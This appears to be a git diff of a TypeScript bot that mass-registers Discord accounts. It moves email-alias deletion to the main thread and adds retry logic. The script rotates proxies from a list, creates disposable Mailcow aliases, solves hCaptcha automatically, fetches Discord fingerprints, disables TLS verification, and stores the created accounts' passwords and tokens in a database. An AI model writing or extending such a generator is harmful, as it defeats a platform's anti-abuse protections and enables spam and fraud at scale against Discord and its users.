@@ -1,8 +1,7 @@
 import * as dotenv from 'dotenv'
 dotenv.config();
 
-import { isMainThread, Worker, threadId } from 'worker_threads'
-import { HttpsProxyAgent } from 'https-proxy-agent';
+import { isMainThread, Worker, threadId, parentPort } from 'worker_threads'
 import { solveCaptcha } from './hcaptcha'
 import { randomString, sleep } from './utils'
 
@@ -14,6 +13,7 @@ import utf8 from 'utf8'
 import qp from 'quoted-printable'
 
 if(isMainThread) {
+    const aliasIds = {};
 
     const workers = [];
     for(let i = 0; i < process.env.WORKERS; i++) {
@@ -25,6 +25,10 @@ if(isMainThread) {
             worker.on('exit', (code) => {
                 console.log(`Worker ${i} exited with code ${code}`)
             });
+
+            worker.on('message', val => {
+                aliasIds[val.username] = val.id;
+            })
         }))
     }
 
@@ -110,6 +114,7 @@ if(isMainThread) {
                                                     if(err) throw err;
                                                 });
                                             });*/
+                                            deleteAlias(aliasIds[user]);
                                             resolve(null);
                                         }).catch(err => {
                                             console.error(`[${threadId}] Failed to verify account ${user} ! `, err);
@@ -138,6 +143,27 @@ if(isMainThread) {
             imap.connect();
         });
     }
+
+    function deleteAlias(id: number) : Promise<boolean> {
+        return new Promise((resolve, reject) => {
+            axios.post(`${process.env.MAILCOW_HOST}/api/v1/delete/alias`, {
+                json: [
+                    id
+                ]
+            }, {
+                headers: {
+                    'X-API-Key': process.env.MAILCOW_API_KEY
+                }
+            }).then(res => {   
+                const json = res.data;
+                 if(json[0].type === 'success') {
+                     resolve(true);
+                 } else {
+                     resolve(false);
+                 }
+            })
+        })
+    }
 } else {
     process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
     console.log("Initializing worker #" + threadId)
@@ -153,16 +179,12 @@ if(isMainThread) {
     const proxies = fs.readFileSync("proxies.txt").toString().split("\n");
     
     (async function main() {
-        for(let i = 0; i < process.env.ACCOUNT_TO_GENERATE; i++) {
-            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-            await generateAccount(randomString(10), randomString(16), new HttpsProxyAgent({
-                host: proxy.split(":")[0],
-                port: proxy.split(":")[1]
-            }));
+        for(let i = 0; i < process.env.ACCOUNT_TO_GENERATE; i++) { 
+            await generateAccount(randomString(10), randomString(16), proxies[Math.floor(Math.random() * proxies.length)]);
         }
     })();
 
-    async function generateAccount(username: string, password: string, proxy: HttpsProxyAgent) {
+    async function generateAccount(username: string, password: string, proxy: string) {
         console.log(`[${threadId}] Generating account ${username}:${password}`);
     
         const id = await createAlias(username);
@@ -175,7 +197,19 @@ if(isMainThread) {
         const captchaKey = await solveCaptcha(sitekey, "discord.com");
         console.log(`[${threadId}] Captcha solved !`);
     
-        const fingerprint = (await axios.get('https://discord.com/api/v9/experiments')).data.fingerprint;
+        const res = await axios.get('https://discord.com/api/v9/experiments', {
+            validateStatus: s => true
+        });
+
+        if(!res.data.fingerprint) {
+            console.log(res);
+            console.error('Registration failed ! retrying...');
+            await sleep(10000);
+            await generateAccount(username, password, proxy);
+            return; 
+        }
+
+        const fingerprint = res.data.fingerprint;
         console.log(`[${threadId}] Fingerprint: ${fingerprint}`);
     
         const data = (await axios.post('https://discord.com/api/v9/auth/register', {
@@ -208,7 +242,10 @@ if(isMainThread) {
         console.log(`[${threadId}] Account created !`);
 
         await saveToDatabase(username, username + "@" + process.env.MAILCOW_DOMAIN, password,  data.token);
-        //await deleteAlias(id);
+        parentPort.postMessage({
+            username: username + "@" + process.env.MAILCOW_DOMAIN,
+            id
+        });
     }
     
     function createAlias(name : string) : Promise<number> {
@@ -234,28 +271,7 @@ if(isMainThread) {
             })
         })
     }
-    
-    function deleteAlias(id: number) : Promise<boolean> {
-        return new Promise((resolve, reject) => {
-            axios.post(`${process.env.MAILCOW_HOST}/api/v1/delete/alias`, {
-                json: [
-                    id
-                ]
-            }, {
-                headers: {
-                    'X-API-Key': process.env.MAILCOW_API_KEY
-                }
-            }).then(res => {   
-                const json = res.data;
-                 if(json[0].type === 'success') {
-                     resolve(true);
-                 } else {
-                     resolve(false);
-                 }
-            })
-        })
-    }
-    
+
     async function saveToDatabase(name: string, email: string, password: string, token: string) {
         let conn;
         try {
